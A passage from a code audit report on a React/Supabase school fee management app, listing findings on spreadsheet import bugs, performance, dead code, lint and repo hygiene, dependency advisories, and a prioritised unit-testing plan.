- Evidence: `fileHeaders.find(h => h === alias || h.includes(alias))`. Short aliases match unrelated headers: students `studentId` alias `"id"` matches "Paid", "Valid", "Provider ID", "Guardian"; `grade` alias `"year"`/`"level"`; `name` alias `"contact"` matches "Contact Phone"; employees `phone` alias `"mobile"`; invoices `month` aliases `["description","memo","reference","period"]` and `notes` aliases `["notes","memo","description"]` map the same column to both; payments `account` and `category` both list `"account"`; accounts `name` list includes `"account"`/`"description"` and `description` list includes `"description"`. students `monthlyFee` aliases include `"balance"`/`"amount"` (a Manager.io customer balance becomes the monthly fee, which later auto-generates recurring invoices of that amount). First match wins and iteration order of `columnMap` decides which field gets a column.
- Impact: Plausible-looking but wrong data is written (fees, phone, ids) with only a 5-row preview of the mapped fields and "Fields mapped: N" showing the template size, not the actual detected count.
- Fix: Exact match on normalised header first, then explicit alias list (no `includes`); each source column used at most once; show a mapping table the user can override before import; show unmapped required columns as errors.
- Verified: yes

### [CODE-29] No type normalisation or validation; DB errors arrive row by row
- Severity: Medium
- Effort: M
- Location: `src/pages/Import.jsx:151-168`, `:190-200`, `:253-282`
- Evidence: Every value becomes `String(row[header]).trim()`. `XLSX.utils.sheet_to_json` is called without `raw:false`/`cellDates`, so Excel date cells arrive as serial numbers ("45366") and are stored in `date`/`due_date`; amounts like "5,000" or "Rs. 5000" stay strings and fail on `numeric` columns, as do blank dates. `requiredColumns` only checks presence (e.g. `amount: "abc"` passes for payments). Row errors are reported as "Error: ..." with no row number or content. The parse only reads the first sheet; `.xls`/`.csv` encodings (BOM, semicolon separators) are not handled.
- Impact: Large fractions of a real Manager.io export fail, and the failures can't be traced back to a source row.
- Fix: Per-type schema (zod/yup or hand-rolled): trim, strip currency/commas, parse dates (`cellDates: true`), enum-check `status`/`type`, `amount > 0`; validate ALL rows before writing and show a downloadable error report with row numbers.
- Verified: yes

### [CODE-30] No duplicate detection, rollback or partial-failure recovery
- Severity: Medium
- Effort: M
- Location: `src/pages/Import.jsx:253-282`
- Evidence: Sequential `await addDoc` per row inside a `for` loop; errors are collected as strings and the run continues. No dedupe on `studentId`/name+phone, `code` (accounts) or invoice (student, month, year). No import batch id, so a partial import cannot be undone; re-uploading the same file doubles all rows. No `logActivity`, so imports are absent from the audit log.
- Impact: Duplicate students/accounts/payments after a retry; payments imported (cash movements) cannot be reverted as a batch; no audit trail for the largest data change the app supports.
- Fix: Insert in chunks with a single `insert(rows)` per chunk, tag rows with `extra.importBatchId`, check duplicates against existing data first (show "skip / update"), add a "Undo this import" action, log the import.
- Verified: yes

### [CODE-31] Imported invoices and payments skip the app's linkage rules
- Severity: Medium
- Effort: M
- Location: `src/pages/Import.jsx:59-81`, `:122-148`, `:102-121`
- Evidence: Invoices import `studentName` and never resolves it to `studentId` (the Fees/StudentLedger code filters on `studentId`, so the ledger for the student shows nothing); `status` becomes `paid` when the text includes "paid" but `paidAmount`, `paidAccount` and a ledger payment are not created; `year`/`month` are not split out of `description` (the month column is mapped from "description"); `dueDate` is a raw string. Payments import never validates that `account` matches an existing account name (CODE-18) and the `type` heuristic `includes("out")` classifies "Outstanding"/"Without" as `cash_out`; the `amount` alias list contains both `debit` and `credit`, so the sign convention is lost. Accounts import writes `balance` as a string and `subType` from the same `type` column (so `Assets` accounts get `subType: "Assets"` and appear as bank accounts via `a.type === "Assets"`).
- Impact: Imported history is invisible in ledgers/reports or double counts bank balances.
- Fix: Resolve students by id/name with a review step; create the ledger payment for imported `paid` invoices (or mark them `source:"import"` and exclude consistently); require explicit `type` and sign.
- Verified: yes

### [CODE-32] Large-file behaviour
- Severity: Low
- Effort: S
- Location: `src/pages/Import.jsx:151-168`, `:253-282`
- Evidence: The whole file is read into memory (`FileReader.readAsArrayBuffer`) and parsed on the main thread; no size/row cap; import is one network round trip per row (e.g. 5,000 rows ≈ 5,000 sequential requests) with no progress indicator (only a static label) and no cancel; the component renders the first 5 rows only (fine). The `xlsx` chunk is 138 kB gzip (loaded lazily, good).
- Impact: UI freeze on big files; long, uncancelable imports that fail midway on token refresh.
- Fix: Cap rows (e.g. 5,000) with a message, chunked inserts of 200 with a progress bar and abort, parse in a worker for large files.
- Verified: yes (code); no (timed)

---

## F. Performance and structure

### [CODE-35] Duplicate full-table subscriptions, client-side filtering, no virtualization or server pagination
- Severity: Medium
- Effort: L
- Location: `src/pages/Fees.jsx:71-84`, `Payslips.jsx:49-60`, `Expenses.jsx:50-61`, `BankCash.jsx:12-20`, `AccountDetail.jsx:17-27`, `StudentLedger.jsx:18-30`, `src/components/UI/Pagination.jsx`, `src/hooks/useCollection.js`
- Evidence: Each page creates its own `onSnapshot` for the tables it needs and tears it down on navigation, so moving Fees -> Payslips -> Fees refetches `students`, `invoices`, `accounts` each time (3 channels + 3 full SELECTs per page). `Accounts` is fetched on 8 pages. Pages recompute `filtered`/`.sort`/totals on every render without `useMemo` (Fees: `filtered`, `bulk = useBulkSelect(filtered.map(...))` creates a new array each render, and `validKey` joins all ids each time). `Pagination.jsx` is a presentational control over a client-side slice. Payslips, Journals, Users, ReminderLogs and the mobile card views of several pages render all rows. StudentLedger loads ALL invoices and ALL payments to show one student (no `where`).
- Impact: Slow page opens and sluggish typing as data grows, many Realtime channels per tab, and large DOMs on Payslips/Journals.
- Fix: Introduce a shared data layer (React Query/SWR with realtime invalidation, or a `DataProvider` keyed by collection) so each table is fetched once; add server-side `eq/ilike/range` helpers to the shim for list and ledger pages; virtualise (`react-window`) or paginate Payslips/Journals; memoise derived lists.
- Verified: yes (code); no (profiled)

### [CODE-36] Repeated CRUD/table/modal patterns that should be shared
- Severity: Medium
- Effort: L
- Location: `useIsMobile` is copy-pasted in 8 files (`BulkEditModal.jsx`, `Fees.jsx`, `Payslips.jsx`, `Payments.jsx`, `Employees.jsx`, `Expenses.jsx`, `Students.jsx`, `ActivityLog.jsx`); `MONTHS` in 5 files; `ALL_PERMISSIONS` duplicated in `Users.jsx` and `AccessOverview.jsx`; `bankCashAccounts` re-implemented inline in `Payments.jsx:80`, `BankCash.jsx:14`, `accounting.js:58`; `modalStyle`/`sheetStyle`, the header-button block (CSV/PDF/Add), the bulk delete/edit handlers (`handleBulkDelete`/`handleBulkEditApply`, near-identical in 7 pages), the "reverse then delete" handler (3 pages), and date parsing in `Fees.jsx:99-104` (duplicates `dates.toMillis`).
- Impact: Every fix (e.g. CODE-11, CODE-20) must be repeated N times; inconsistencies already exist (CODE-21).
- Fix: Extract `useMediaQuery`, `<Modal>`/`<ConfirmDialog>` (the empty `components/UI/Modal.jsx` is the obvious home), `<DataTable>` with selection + pagination, `useCrudResource(name)` (subscribe + create/update/delete + toast + audit log), `lib/permissions.js` (catalogue), `lib/dates.js` (all date helpers).
- Verified: yes

### [CODE-37] Oversized components to split
- Severity: Medium
- Effort: L
- Location: `Fees.jsx` 988 lines, `Users.jsx` 703, `Payslips.jsx` 653, `Import.jsx` 587, `Expenses.jsx` 535, `Payments.jsx` 499, `firebase.js` 522
- Evidence: Each file mixes data subscriptions, business rules (payment status maths, reversal), 3-6 modals and the mobile + desktop views of the same list.
- Impact: Hard to test, and the business logic (e.g. `confirmPay`) cannot be unit tested without rendering the page.
- Fix: Fees -> `FeesPage` + `InvoiceTable` + `ReceivePaymentModal` + `BulkReceiveModal` + `NewInvoiceModal` + `useInvoices()` + pure `lib/feeMath.js`. Users -> `UsersTab`, `RolesTab`, `PermissionsEditor`, `UserModal`. Import -> `lib/importers/*.js` (templates, `mapColumns`, `parseFile`) + `ImportWizard`. Split `firebase.js` into `shim/encode.js`, `shim/query.js`, `shim/realtime.js`, `shim/bulk.js`.
- Verified: yes

### [CODE-41] `useCollection` dependency and sorting quirks
- Severity: Low
- Effort: S
- Location: `src/hooks/useCollection.js:75`, `:77-93`; `src/hooks/useBulkSelect.js:16-25`
- Evidence: ESLint `react-hooks/exhaustive-deps`: `filters`, `filterFns`, `searchFields` missing and two "complex expression" warnings (`JSON.stringify(filters)`, `searchFields.join(",")`); `filterFns` are not in the deps at all, so a changed predicate closure (e.g. new `dateFrom` fn) is used stale. `sort` treats `null` as `0` (`Number(null) === 0`), so empty fees sort as zero and numeric-looking text ids ("001", "1") compare equal. `useCollection` is used by only 3 of 15 list pages. Only `loading` is exposed, no `error`.
- Impact: Occasional stale filter results; confusing sort order for blank values.
- Fix: Memoise `filters` in callers, include `filterFns`, treat `null/""` explicitly; expose `error`; migrate the remaining pages.
- Verified: yes

### [CODE-33] ReminderLogs: leaked subscription and missing backend
- Severity: Medium
- Effort: S
- Location: `src/pages/ReminderLogs.jsx:13-46`
- Evidence: The "orderBy failed, fall back" branch is Firestore-index thinking: in the shim an error callback only fires on a failed fetch, but the original realtime channel stays subscribed; the fallback `onSnapshot` assigns over `unsub`, so the cleanup only unsubscribes the second one. `fetchStats()` loads every invoice just to count `pending`/`overdue` (`i.status === "pending"`, partial ignored; `new Date(i.dueDate) < today` parsed as UTC). The "Send Reminders Now" button relies on the missing `/api/send-reminders` (CODE-26).
- Impact: A leaked Realtime channel per mount in the failure case; a button that cannot work.
- Fix: Delete the fallback (the shim sorts), use a count query or SQL view for the stats, and implement the endpoint.
- Verified: yes

---

## G. Dead code, tooling, repo hygiene

### [CODE-38] Dead code, unused files and unused imports
- Severity: Low
- Effort: S
- Location: see list
- Evidence: Zero-byte files: `src/components/UI/Modal.jsx`, `Badge.jsx`, `Table.jsx`, `src/hooks/useFirestore.js`, `src/utils/invoiceGenerator.js`. Never imported: `components/ProtectedSection.jsx` (the one permission-gating component, see CODE-22). ESLint `no-unused-vars` warnings: `ProtectedSection.jsx:1 React`, `AccountDetail.jsx:5 ArrowUpCircle, ArrowDownCircle`, `Employees.jsx:3 onSnapshot`, `Fees.jsx:33 branches`, `Import.jsx:223 preview` (state set, never read), `Login.jsx:6 supabase`, `Settings.jsx:2 sendWhatsAppMessage`, `Trash.jsx:27 isAdmin`, `Users.jsx:2 auth`, `:5 setDoc`, `:175 roleId`; `Layout.jsx:31` missing `isMobile` dep; `Payslips.jsx` `visibleIds` and `Trash.jsx` `visibleIds` computed but unused. `firebase.js` exports `auth`/`storage`/`supabase`/`db` "for compatibility" that only Users/Login import (and Login uses undefined ones). `logAction()` in `auditLog.js` has no caller. Dependency check by import scan: `react-hook-form` and `date-fns` are in `package.json` but not imported anywhere in `src/`; `lucide-react` is imported by name (tree-shaken, OK).
- Impact: Noise; two unused dependencies ship in `package-lock` only (not in the bundle).
- Fix: Delete the empty files and unused deps, enable the real ESLint config (CODE-40) and fix warnings.
- Verified: yes (ESLint output, grep for imports)

### [CODE-39] Service worker is mis-named, and its logic would be harmful if fixed
- Severity: Low
- Effort: S
- Location: `public/sw.js ` (note the trailing space in the file name), `src/index.js:11-18`
- Evidence: The file on disk is `sw.js ` so `/sw.js` 404s (Vercel rewrites it to `index.html` -> registration fails with a MIME error that is only `console.log`ged). Its content would also fail install: `cache.addAll(["/static/js/main.chunk.js", "/static/css/main.chunk.css"])` are CRA 4 names and do not exist in CRA 5 (hashed). The fetch handler is cache-first for everything, with a fixed `zmi-v1` cache name that is never bumped.
- Impact: Currently inert (good). If someone renames the file, it breaks installs or serves stale builds forever.
- Fix: Delete the file and the registration, or adopt Workbox via CRA's `cra-template-pwa` with a proper cache-busting strategy.
- Verified: yes

### [CODE-40] The build does not lint; real lint errors ship
- Severity: Medium
- Effort: S
- Location: `package.json` (no `eslintConfig`), build script `"build": "CI= react-scripts build"`
- Evidence: With no `eslintConfig`, CRA's webpack plugin applies only a minimal base config, so `CI=true react-scripts build` printed "Compiled successfully" while ESLint with `react-app` reports 7 errors (`Login.jsx:49` `signInWithEmailAndPassword`/`auth` undefined, `QuickAdd.jsx:19-25` conditional hooks) and 17 warnings. The build script also forces `CI=` so warnings would never fail a deploy anyway.
- Impact: A runtime `ReferenceError` (CODE-15) and a hooks violation (CODE-17) reached the main branch.
- Fix: Add `"eslintConfig": { "extends": ["react-app", "react-app/jest"] }`, add `"lint": "eslint src --ext .js,.jsx"` and run it in CI; remove the `CI=` override once clean.
- Verified: yes

### [CODE-43] Audit log writer is fire-and-forget with a client-supplied author
- Severity: Low
- Effort: S
- Location: `src/utils/auditLog.js:17-69`
- Evidence: `logActivity` swallows all errors (`console.error`) and callers do not await it (a failed insert is invisible; the action is not blocked or retried). The `user` column is the email string set by the client (`user: email || "unknown"`), so a user can insert entries attributed to someone else (RLS allows any authenticated insert per the file header). `onAuthStateChange` is registered at module import and never unsubscribed. `logAction` is unused.
- Impact: An incomplete and forgeable trail. Imports (CODE-30) and Settings changes are not logged at all.
- Fix: Set `user_id = auth.uid()` via a DB default or trigger and drop the client `user`; log through a DB trigger on the money tables so it cannot be skipped.
- Verified: yes

### [CODE-44] No `.gitignore`; `node_modules` is untracked in the working tree
- Severity: Medium
- Effort: S
- Location: repo root
- Evidence: `git status --short` -> `?? node_modules/` after install; no `.gitignore` file exists, so `.env`/`.env.local` (holding `REACT_APP_SUPABASE_*`, WhatsApp token, cron secret) and `build/` would also be committed by `git add .`.
- Impact: Secrets committed by accident; a 600 MB commit. (This audit run created `node_modules/` by running `npm install`; it should not be committed.)
- Fix: Add `.gitignore` with `node_modules`, `build`, `.env*`, `.DS_Store`.
- Verified: yes

### [CODE-45] `xlsx` 0.18.5 has known advisories
- Severity: Low
- Effort: S
- Location: `package.json` dependency `xlsx ^0.18.5`, used only in `src/pages/Import.jsx`
- Evidence: SheetJS 0.18.5 (the last npm release) is affected by CVE-2023-30533 (prototype pollution when parsing crafted files) and CVE-2024-22363 (ReDoS); fixes ship only from the SheetJS CDN (0.20.x). It parses admin-uploaded files only (`/import` needs `canManageUsers`), which lowers exposure. Not run through `npm audit` here (see `devops-deps-auditor`).
- Impact: A malicious spreadsheet could pollute prototypes or hang the browser tab for an admin.
- Fix: Install the SheetJS 0.20.x tarball from their CDN or switch to `exceljs`/`papaparse` (CSV only).
- Verified: no

### [CODE-46] Bundle size snapshot (gzip) and code-splitting status
- Severity: Info
- Effort: S
- Location: build output (scratchpad)
- Evidence: `main` 125 kB (react, router, supabase-js, toast, lucide-by-name, shared code); `xlsx` chunk 138 kB (only fetched on `/import`); `recharts` chunk 98 kB (Dashboard + Reports); all other route chunks <12 kB. All pages except Login are `React.lazy` in `App.js` and wrapped in `Suspense`, so code-splitting is already good. `lucide-react` is imported by name everywhere (tree-shaken). Remaining gains: Dashboard is the default route for most roles, so `recharts` (98 kB) is on the critical path; consider a lighter chart or lazy-loading the charts inside Dashboard; `supabase-js` is in `main`.
- Impact: Fine for office use over broadband; first load on mobile data ~225 kB gzip JS before Dashboard.
- Fix: Optional: `React.lazy` the chart components; add `source-map-explorer` to track size.
- Verified: yes

---

## H. Testing: there are no tests. Highest-value 10 units to cover first

No test files exist and `@testing-library/*` is not installed (`react-scripts test` runs Jest, so `npm i -D @testing-library/react @testing-library/jest-dom @testing-library/user-event` is all that is needed). Several of these units are inline in components and need a small extraction first (noted).

### [CODE-47] Add tests for the units below (listed in priority order)
- Severity: Medium
- Effort: L (about 2-3 days for all ten)
- Location: new `src/**/__tests__/*.test.js`
- Evidence: Zero tests; every defect in sections A-E is detectable by a unit test of one of the items below.
- Impact: Money logic and permission logic change without any safety net.
- Fix: Implement these, in this order:
  1. **`utils/accounting.js`** (mock `supabase` and the shim). `recordPayment`: throws on missing account; amount `0`, `"-5"`, `"abc"`, `NaN`; amount string coerced to number; date defaults to today (use fake timers and `TZ`). `getSourcePaidTotal`: cash_in minus cash_out; ignores `reversed` originals and `reversalOf` rows; empty sourceId -> `[]`. `reversePayment`: second step fails -> assert the original is NOT left `reversed:true` (will fail today; documents CODE-09). `reverseSourcePayments`: partial failure returns/throws consistently; idempotent when called twice.
  2. **`firebase.js` `encode`/`decode`** (export them). Round trip for each table; camel/snake mapping (`branchId`<->`branch_id`); unknown keys into `extra` and back; `SERVER_TS` replaced by an ISO string; `id` skipped; `undefined`/`null`/nested objects/arrays; `extra` keys do not clobber column keys on decode; key like `paidAmount` on `invoices`.
  3. **`firebase.js` `updateDoc`/`updateDocs`** (mock supabase builder): a patch with only column keys issues one `update().in()`; a patch with extra keys read-merges per row and preserves existing `extra` (regression for CODE-04); chunk failure behaviour (CODE-08); zero-row result is detected (CODE-03); `ids=[]` returns 0 without a request; `deleteDoc` on a soft-delete table updates `deleted_at`, on `users`/`custom_roles` hard-deletes.
  4. **`firebase.js` `onSnapshot` cache reducer** (extract `applyEvent(cache, event, ref)` as a pure function). INSERT inserts once (duplicate INSERT replaces), UPDATE replaces, UPDATE that sets `deleted_at` removes from a live view and adds to the trash view, restore does the reverse, DELETE with and without `old.id`, `orderBy` asc/desc with `null`/numeric/string values, `limit` after removal, stale `fullFetch` result arriving after a newer event (CODE-05).
  5. **Permission resolution in `UserContext`** (extract `resolvePermissions({ role, customRolePerms, overrides })` and test `can`). Admin ignores overrides; built-in roles match the table; override true/false flips one flag; unknown role -> no access (will fail today, CODE-01); custom role with perms not yet loaded; `can(undefined)` true; `can("canX")` strictly `=== true`; role defaults for every role vs. the SQL `has_perm` defaults (a data-driven test to keep client and DB in sync).
  6. **`utils/dates.js`** plus the new `todayLocal()`. `toDate` with Firestore-like `{toDate()}`, `{seconds}`, ISO with/without offset, `"2026-03-31"`, epoch ms, `""`, `null`, `"garbage"` -> `null`; `toMillis` invalid -> 0; `formatDate` fallback `"—"`; run the file under `TZ=Asia/Karachi` and `TZ=America/Los_Angeles` to pin down CODE-20.
  7. **Import parsing** (extract `parseFile`, `mapColumns`, `TEMPLATES` to `lib/importers.js`). Alias matching: header `Paid` must not map to `studentId` (CODE-28); `Customer Name` -> `name`; one source column used once; case/whitespace insensitive; blank rows dropped; BOM'd CSV; Excel date serial -> ISO date; `"5,000"`/`"Rs. 5000"` -> 5000; `transform` for invoices (`"Paid"`, `"Unpaid"`, `"paid in full"`), payments (`"Debit"`, `"Outstanding"` must not be `cash_out`), required columns missing -> row rejected with the row number; 10k-row performance smoke test.
  8. **Fee payment maths** (extract `computeFeePayment({ total, alreadyPaid, amount, concession })` from `Fees.confirmPay`). Exact payment -> `paid`; partial -> `partial` with correct balance; over-payment rejected with the 0.001 tolerance; concession closes the remainder and sets `concessionAmount` = remaining; `amount = 0` + concession; `amount = 0` without concession rejected; negative and `NaN` amounts; floating point (`0.1 + 0.2`); repeated payments accumulate. Also cover `Dashboard`/`Reports` "collected/pending" so the two screens agree (CODE-19).
  9. **`utils/exportUtils.js`**. CSV quoting of `"`/commas/newlines, `null`/`undefined` cells, formula-leading cells are neutralised (CODE-16); PDF HTML escapes `<script>` and `<img onerror>` in cells and title; popup blocked (`window.open` returns null) does not throw.
  10. **`useCollection` + `matchesBranch`** (`renderHook` with a mocked `onSnapshot`). Branch rules for `"all"`, `"main"` (empty/`"main"`/missing `branchId`), a specific branch; search across `searchFields`, case-insensitive, null-safe; `filters` ignore `""`/null; `filterFns` only run when the filter is set; sort numeric vs text vs null; page clamping when the filtered set shrinks; unsubscribes on unmount and on `name` change; error callback sets `loading=false`.
  
  Next tier: `utils/bulk.js` (`runBulk` ordering/progress/failure list, `bulkResultMessage` wording), `useBulkSelect` pruning, `whatsapp.js` (unconfigured/HTTP error/network error shapes), `AuthContext` (same-user token refresh does not replace the user object), and an integration test of the delete-restore round trip on a paid invoice (CODE-10).
- Verified: no (planned work)

---

## ESLint results (`eslint-config-react-app`, run outside the build)

```
7 errors:
  Login.jsx:49        'signInWithEmailAndPassword' is not defined (no-undef)
  Login.jsx:49        'auth' is not defined (no-undef)
  QuickAdd.jsx:19-25  useState called conditionally (rules-of-hooks) x5
17 warnings:
  exhaustive-deps: Layout.jsx:31, useBulkSelect.js:25, useCollection.js:75 (x3)
  no-unused-vars: ProtectedSection, AccountDetail, Employees, Fees, Import, Login, Settings, Trash, Users (x3)
```

The `CI=true npm run build` equivalent (`react-scripts build`) completed successfully (see CODE-40 for why it hides the above).
